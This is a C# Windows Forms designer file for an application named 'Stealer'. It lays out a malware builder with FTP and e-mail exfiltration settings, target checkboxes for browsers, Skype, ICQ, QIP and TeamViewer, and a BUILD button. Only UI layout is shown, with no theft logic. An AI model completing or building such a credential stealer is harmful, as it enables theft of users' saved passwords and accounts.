namespace Stealer
{
    partial class Stealer
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Stealer));
            this.menuStrip1 = new System.Windows.Forms.MenuStrip();
            this.fileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.OpenFiletoolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.buildToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
            this.exitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.infoToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.aboutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.gb_ftp = new System.Windows.Forms.GroupBox();
            this.cb_com_Ftp = new System.Windows.Forms.CheckBox();
            this.tb_ftp_pass = new System.Windows.Forms.TextBox();
            this.lb_ftp_pass = new System.Windows.Forms.Label();
            this.tb_ftp_user = new System.Windows.Forms.TextBox();
            this.lb_ftp_user = new System.Windows.Forms.Label();
            this.tb_ftp_host = new System.Windows.Forms.TextBox();
            this.lb_ftp_host = new System.Windows.Forms.Label();
            this.gb_email = new System.Windows.Forms.GroupBox();
            this.tb_email_to = new System.Windows.Forms.TextBox();
            this.lb_email_to = new System.Windows.Forms.Label();
            this.cb_com_Email = new System.Windows.Forms.CheckBox();
            this.tb_email_pass = new System.Windows.Forms.TextBox();
            this.lb_email_pass = new System.Windows.Forms.Label();
            this.tb_email_from = new System.Windows.Forms.TextBox();
            this.lb_email_from = new System.Windows.Forms.Label();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.button2 = new System.Windows.Forms.Button();
            this.cb_QIP = new System.Windows.Forms.CheckBox();
            this.cb_ICQ = new System.Windows.Forms.CheckBox();
            this.cb_TeamViewer = new System.Windows.Forms.CheckBox();
            this.cb_Skype = new System.Windows.Forms.CheckBox();
            this.cb_Safari = new System.Windows.Forms.CheckBox();
            this.cb_Opera = new System.Windows.Forms.CheckBox();
            this.cb_FireFox = new System.Windows.Forms.CheckBox();
            this.cb_Google = new System.Windows.Forms.CheckBox();
            this.cb_IE = new System.Windows.Forms.CheckBox();
            this.button1 = new System.Windows.Forms.Button();
            this.menuStrip1.SuspendLayout();
            this.gb_ftp.SuspendLayout();
            this.gb_email.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.SuspendLayout();
            // 
            // menuStrip1
            // 
            this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.fileToolStripMenuItem,
            this.infoToolStripMenuItem});
            this.menuStrip1.Location = new System.Drawing.Point(0, 0);
            this.menuStrip1.Name = "menuStrip1";
            this.menuStrip1.Size = new System.Drawing.Size(519, 29);
            this.menuStrip1.TabIndex = 0;
            this.menuStrip1.Text = "menuStrip1";
            // 
            // fileToolStripMenuItem
            // 
            this.fileToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.OpenFiletoolStripMenuItem1,
            this.buildToolStripMenuItem,
            this.toolStripSeparator1,
            this.exitToolStripMenuItem});
            this.fileToolStripMenuItem.Name = "fileToolStripMenuItem";
            this.fileToolStripMenuItem.Size = new System.Drawing.Size(46, 25);
            this.fileToolStripMenuItem.Text = "File";
            // 
            // OpenFiletoolStripMenuItem1
            // 
            this.OpenFiletoolStripMenuItem1.Name = "OpenFiletoolStripMenuItem1";
            this.OpenFiletoolStripMenuItem1.Size = new System.Drawing.Size(152, 26);
            this.OpenFiletoolStripMenuItem1.Text = "&OpenFile...";
            this.OpenFiletoolStripMenuItem1.Click += new System.EventHandler(this.OpenFiletoolStripMenuItem1_Click);
            // 
            // buildToolStripMenuItem
            // 
            this.buildToolStripMenuItem.Name = "buildToolStripMenuItem";
            this.buildToolStripMenuItem.Size = new System.Drawing.Size(152, 26);
            this.buildToolStripMenuItem.Text = "&Build";
            // 
            // toolStripSeparator1
            // 
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new System.Drawing.Size(149, 6);
            // 
            // exitToolStripMenuItem
            // 
            this.exitToolStripMenuItem.Name = "exitToolStripMenuItem";
            this.exitToolStripMenuItem.Size = new System.Drawing.Size(152, 26);
            this.exitToolStripMenuItem.Text = "&Exit";
            // 
            // infoToolStripMenuItem
            // 
            this.infoToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.aboutToolStripMenuItem});
            this.infoToolStripMenuItem.Name = "infoToolStripMenuItem";
            this.infoToolStripMenuItem.Size = new System.Drawing.Size(49, 25);
            this.infoToolStripMenuItem.Text = "Info";
            // 
            // aboutToolStripMenuItem
            // 
            this.aboutToolStripMenuItem.Name = "aboutToolStripMenuItem";
            this.aboutToolStripMenuItem.Size = new System.Drawing.Size(122, 26);
            this.aboutToolStripMenuItem.Text = "&About";
            // 
            // gb_ftp
            // 
            this.gb_ftp.Controls.Add(this.cb_com_Ftp);
            this.gb_ftp.Controls.Add(this.tb_ftp_pass);
            this.gb_ftp.Controls.Add(this.lb_ftp_pass);
            this.gb_ftp.Controls.Add(this.tb_ftp_user);
            this.gb_ftp.Controls.Add(this.lb_ftp_user);
            this.gb_ftp.Controls.Add(this.tb_ftp_host);
            this.gb_ftp.Controls.Add(this.lb_ftp_host);
            this.gb_ftp.Location = new System.Drawing.Point(12, 32);
            this.gb_ftp.Name = "gb_ftp";
            this.gb_ftp.Size = new System.Drawing.Size(358, 142);
            this.gb_ftp.TabIndex = 1;
            this.gb_ftp.TabStop = false;
            this.gb_ftp.Text = "FTP";
            // 
            // cb_com_Ftp
            // 
            this.cb_com_Ftp.AutoSize = true;
            this.cb_com_Ftp.Location = new System.Drawing.Point(282, 19);
            this.cb_com_Ftp.Name = "cb_com_Ftp";
            this.cb_com_Ftp.Size = new System.Drawing.Size(49, 17);
            this.cb_com_Ftp.TabIndex = 6;
            this.cb_com_Ftp.Text = "-FTP";
            this.cb_com_Ftp.UseVisualStyleBackColor = true;
            // 
            // tb_ftp_pass
            // 
            this.tb_ftp_pass.Location = new System.Drawing.Point(63, 108);
            this.tb_ftp_pass.Name = "tb_ftp_pass";
            this.tb_ftp_pass.Size = new System.Drawing.Size(278, 20);
            this.tb_ftp_pass.TabIndex = 5;
            this.tb_ftp_pass.UseSystemPasswordChar = true;
            // 
            // lb_ftp_pass
            // 
            this.lb_ftp_pass.AutoSize = true;
            this.lb_ftp_pass.Location = new System.Drawing.Point(13, 112);
            this.lb_ftp_pass.Name = "lb_ftp_pass";
            this.lb_ftp_pass.Size = new System.Drawing.Size(38, 13);
            this.lb_ftp_pass.TabIndex = 4;
            this.lb_ftp_pass.Text = "PASS:";
            // 
            // tb_ftp_user
            // 
            this.tb_ftp_user.Location = new System.Drawing.Point(63, 75);
            this.tb_ftp_user.Name = "tb_ftp_user";
            this.tb_ftp_user.Size = new System.Drawing.Size(278, 20);
            this.tb_ftp_user.TabIndex = 3;
            // 
            // lb_ftp_user
            // 
            this.lb_ftp_user.AutoSize = true;
            this.lb_ftp_user.Location = new System.Drawing.Point(13, 79);
            this.lb_ftp_user.Name = "lb_ftp_user";
            this.lb_ftp_user.Size = new System.Drawing.Size(40, 13);
            this.lb_ftp_user.TabIndex = 2;
            this.lb_ftp_user.Text = "USER:";
            // 
            // tb_ftp_host
            // 
            this.tb_ftp_host.Location = new System.Drawing.Point(63, 42);
            this.tb_ftp_host.Name = "tb_ftp_host";
            this.tb_ftp_host.Size = new System.Drawing.Size(278, 20);
            this.tb_ftp_host.TabIndex = 1;
            // 
            // lb_ftp_host
            // 
            this.lb_ftp_host.AutoSize = true;
            this.lb_ftp_host.Location = new System.Drawing.Point(14, 46);
            this.lb_ftp_host.Name = "lb_ftp_host";
            this.lb_ftp_host.Size = new System.Drawing.Size(40, 13);
            this.lb_ftp_host.TabIndex = 0;
            this.lb_ftp_host.Text = "HOST:";
            // 
            // gb_email
            // 
            this.gb_email.Controls.Add(this.tb_email_to);
            this.gb_email.Controls.Add(this.lb_email_to);
            this.gb_email.Controls.Add(this.cb_com_Email);
            this.gb_email.Controls.Add(this.tb_email_pass);
            this.gb_email.Controls.Add(this.lb_email_pass);
            this.gb_email.Controls.Add(this.tb_email_from);
            this.gb_email.Controls.Add(this.lb_email_from);
            this.gb_email.Location = new System.Drawing.Point(12, 180);
            this.gb_email.Name = "gb_email";
            this.gb_email.Size = new System.Drawing.Size(358, 150);
            this.gb_email.TabIndex = 2;
            this.gb_email.TabStop = false;
            this.gb_email.Text = "E-MAIL";
            // 
            // tb_email_to
            // 
            this.tb_email_to.Location = new System.Drawing.Point(63, 113);
            this.tb_email_to.Name = "tb_email_to";
            this.tb_email_to.Size = new System.Drawing.Size(278, 20);
            this.tb_email_to.TabIndex = 10;
            // 
            // lb_email_to
            // 
            this.lb_email_to.AutoSize = true;
            this.lb_email_to.Location = new System.Drawing.Point(26, 117);
            this.lb_email_to.Name = "lb_email_to";
            this.lb_email_to.Size = new System.Drawing.Size(25, 13);
            this.lb_email_to.TabIndex = 9;
            this.lb_email_to.Text = "TO:";
            // 
            // cb_com_Email
            // 
            this.cb_com_Email.AutoSize = true;
            this.cb_com_Email.Location = new System.Drawing.Point(282, 20);
            this.cb_com_Email.Name = "cb_com_Email";
            this.cb_com_Email.Size = new System.Drawing.Size(54, 17);
            this.cb_com_Email.TabIndex = 8;
            this.cb_com_Email.Text = "-Email";
            this.cb_com_Email.UseVisualStyleBackColor = true;
            // 
            // tb_email_pass
            // 
            this.tb_email_pass.Location = new System.Drawing.Point(63, 78);
            this.tb_email_pass.Name = "tb_email_pass";
            this.tb_email_pass.Size = new System.Drawing.Size(278, 20);
            this.tb_email_pass.TabIndex = 7;
            this.tb_email_pass.UseSystemPasswordChar = true;
            // 
            // lb_email_pass
            // 
            this.lb_email_pass.AutoSize = true;
            this.lb_email_pass.Location = new System.Drawing.Point(13, 82);
            this.lb_email_pass.Name = "lb_email_pass";
            this.lb_email_pass.Size = new System.Drawing.Size(38, 13);
            this.lb_email_pass.TabIndex = 6;
            this.lb_email_pass.Text = "PASS:";
            // 
            // tb_email_from
            // 
            this.tb_email_from.Location = new System.Drawing.Point(63, 43);
            this.tb_email_from.Name = "tb_email_from";
            this.tb_email_from.Size = new System.Drawing.Size(278, 20);
            this.tb_email_from.TabIndex = 5;
            // 
            // lb_email_from
            // 
            this.lb_email_from.AutoSize = true;
            this.lb_email_from.Location = new System.Drawing.Point(13, 47);
            this.lb_email_from.Name = "lb_email_from";
            this.lb_email_from.Size = new System.Drawing.Size(41, 13);
            this.lb_email_from.TabIndex = 4;
            this.lb_email_from.Text = "FROM:";
            // 
            // groupBox3
            // 
            this.groupBox3.Controls.Add(this.button2);
            this.groupBox3.Controls.Add(this.cb_QIP);
            this.groupBox3.Controls.Add(this.cb_ICQ);
            this.groupBox3.Controls.Add(this.cb_TeamViewer);
            this.groupBox3.Controls.Add(this.cb_Skype);
            this.groupBox3.Controls.Add(this.cb_Safari);
            this.groupBox3.Controls.Add(this.cb_Opera);
            this.groupBox3.Controls.Add(this.cb_FireFox);
            this.groupBox3.Controls.Add(this.cb_Google);
            this.groupBox3.Controls.Add(this.cb_IE);
            this.groupBox3.Location = new System.Drawing.Point(376, 32);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(132, 265);
            this.groupBox3.TabIndex = 2;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "TARGET";
            // 
            // button2
            // 
            this.button2.Location = new System.Drawing.Point(30, 227);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(75, 23);
            this.button2.TabIndex = 9;
            this.button2.Text = "Check all";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // cb_QIP
            // 
            this.cb_QIP.AutoSize = true;
            this.cb_QIP.Location = new System.Drawing.Point(6, 180);
            this.cb_QIP.Name = "cb_QIP";
            this.cb_QIP.Size = new System.Drawing.Size(44, 17);
            this.cb_QIP.TabIndex = 8;
            this.cb_QIP.Text = "QIP";
            this.cb_QIP.UseVisualStyleBackColor = true;
            // 
            // cb_ICQ
            // 
            this.cb_ICQ.AutoSize = true;
            this.cb_ICQ.Location = new System.Drawing.Point(6, 157);
            this.cb_ICQ.Name = "cb_ICQ";
            this.cb_ICQ.Size = new System.Drawing.Size(44, 17);
            this.cb_ICQ.TabIndex = 7;
            this.cb_ICQ.Text = "ICQ";
            this.cb_ICQ.UseVisualStyleBackColor = true;
            // 
            // cb_TeamViewer
            // 
            this.cb_TeamViewer.AutoSize = true;
            this.cb_TeamViewer.Location = new System.Drawing.Point(6, 203);
            this.cb_TeamViewer.Name = "cb_TeamViewer";
            this.cb_TeamViewer.Size = new System.Drawing.Size(85, 17);
            this.cb_TeamViewer.TabIndex = 6;
            this.cb_TeamViewer.Text = "TeamViewer";
            this.cb_TeamViewer.UseVisualStyleBackColor = true;
            // 
            // cb_Skype
            // 
            this.cb_Skype.AutoSize = true;
            this.cb_Skype.Location = new System.Drawing.Point(6, 134);
            this.cb_Skype.Name = "cb_Skype";
            this.cb_Skype.Size = new System.Drawing.Size(56, 17);
            this.cb_Skype.TabIndex = 5;
            this.cb_Skype.Text = "Skype";
            this.cb_Skype.UseVisualStyleBackColor = true;
            // 
            // cb_Safari
            // 
            this.cb_Safari.AutoSize = true;
            this.cb_Safari.Location = new System.Drawing.Point(6, 111);
            this.cb_Safari.Name = "cb_Safari";
            this.cb_Safari.Size = new System.Drawing.Size(53, 17);
            this.cb_Safari.TabIndex = 4;
            this.cb_Safari.Text = "Safari";
            this.cb_Safari.UseVisualStyleBackColor = true;
            // 
            // cb_Opera
            // 
            this.cb_Opera.AutoSize = true;
            this.cb_Opera.Location = new System.Drawing.Point(6, 88);
            this.cb_Opera.Name = "cb_Opera";
            this.cb_Opera.Size = new System.Drawing.Size(55, 17);
            this.cb_Opera.TabIndex = 3;
            this.cb_Opera.Text = "Opera";
            this.cb_Opera.UseVisualStyleBackColor = true;
            // 
            // cb_FireFox
            // 
            this.cb_FireFox.AutoSize = true;
            this.cb_FireFox.Location = new System.Drawing.Point(6, 65);
            this.cb_FireFox.Name = "cb_FireFox";
            this.cb_FireFox.Size = new System.Drawing.Size(89, 17);
            this.cb_FireFox.TabIndex = 2;
            this.cb_FireFox.Text = "MozillaFirefox";
            this.cb_FireFox.UseVisualStyleBackColor = true;
            // 
            // cb_Google
            // 
            this.cb_Google.AutoSize = true;
            this.cb_Google.Location = new System.Drawing.Point(6, 42);
            this.cb_Google.Name = "cb_Google";
            this.cb_Google.Size = new System.Drawing.Size(96, 17);
            this.cb_Google.TabIndex = 1;
            this.cb_Google.Text = "GoogleChrome";
            this.cb_Google.UseVisualStyleBackColor = true;
            // 
            // cb_IE
            // 
            this.cb_IE.AutoSize = true;
            this.cb_IE.Location = new System.Drawing.Point(6, 19);
            this.cb_IE.Name = "cb_IE";
            this.cb_IE.Size = new System.Drawing.Size(100, 17);
            this.cb_IE.TabIndex = 0;
            this.cb_IE.Text = "InternetExplorer";
            this.cb_IE.UseVisualStyleBackColor = true;
            // 
            // button1
            // 
            this.button1.Location = new System.Drawing.Point(376, 307);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(132, 23);
            this.button1.TabIndex = 3;
            this.button1.Text = "BUILD";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // Stealer
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(519, 341);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.groupBox3);
            this.Controls.Add(this.gb_email);
            this.Controls.Add(this.gb_ftp);
            this.Controls.Add(this.menuStrip1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MainMenuStrip = this.menuStrip1;
            this.MaximizeBox = false;
            this.Name = "Stealer";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Stealer";
            this.menuStrip1.ResumeLayout(false);
            this.menuStrip1.PerformLayout();
            this.gb_ftp.ResumeLayout(false);
            this.gb_ftp.PerformLayout();
            this.gb_email.ResumeLayout(false);
            this.gb_email.PerformLayout();
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.MenuStrip menuStrip1;
        private System.Windows.Forms.ToolStripMenuItem fileToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem buildToolStripMenuItem;
        private System.Windows.Forms.ToolStripSeparator toolStripSeparator1;
        private System.Windows.Forms.ToolStripMenuItem exitToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem infoToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem aboutToolStripMenuItem;
        private System.Windows.Forms.GroupBox gb_ftp;
        private System.Windows.Forms.GroupBox gb_email;
        private System.Windows.Forms.GroupBox groupBox3;
        private System.Windows.Forms.TextBox tb_ftp_pass;
        private System.Windows.Forms.Label lb_ftp_pass;
        private System.Windows.Forms.TextBox tb_ftp_user;
        private System.Windows.Forms.Label lb_ftp_user;
        private System.Windows.Forms.TextBox tb_ftp_host;
        private System.Windows.Forms.Label lb_ftp_host;
        private System.Windows.Forms.TextBox tb_email_pass;
        private System.Windows.Forms.Label lb_email_pass;
        private System.Windows.Forms.TextBox tb_email_from;
        private System.Windows.Forms.Label lb_email_from;
        private System.Windows.Forms.CheckBox cb_QIP;
        private System.Windows.Forms.CheckBox cb_ICQ;
        private System.Windows.Forms.CheckBox cb_TeamViewer;
        private System.Windows.Forms.CheckBox cb_Skype;
        private System.Windows.Forms.CheckBox cb_Safari;
        private System.Windows.Forms.CheckBox cb_Opera;
        private System.Windows.Forms.CheckBox cb_FireFox;
        private System.Windows.Forms.CheckBox cb_Google;
        private System.Windows.Forms.CheckBox cb_IE;
        private System.Windows.Forms.CheckBox cb_com_Ftp;
        private System.Windows.Forms.CheckBox cb_com_Email;
        private System.Windows.Forms.Button button2;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.TextBox tb_email_to;
        private System.Windows.Forms.Label lb_email_to;
        private System.Windows.Forms.ToolStripMenuItem OpenFiletoolStripMenuItem1;
    }
}

